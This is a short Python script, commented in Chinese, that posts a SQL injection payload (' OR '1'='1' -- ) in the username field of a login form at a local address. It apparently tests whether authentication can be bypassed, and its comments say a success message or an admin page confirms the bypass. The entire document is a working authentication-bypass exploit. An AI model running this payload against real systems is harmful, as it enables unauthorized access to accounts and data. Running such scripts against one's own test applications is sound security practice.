import requests

url = "http://127.0.0.1:5000/login"
# 构造payload：用户名输入恒真条件，密码随意
data = {
    'username': "' OR '1'='1' -- ",
    'password': 'anything'
}
response = requests.post(url, data=data)
print("登录响应：")
print(response.text)  # 如果返回"登录成功"或显示管理界面，则绕过成功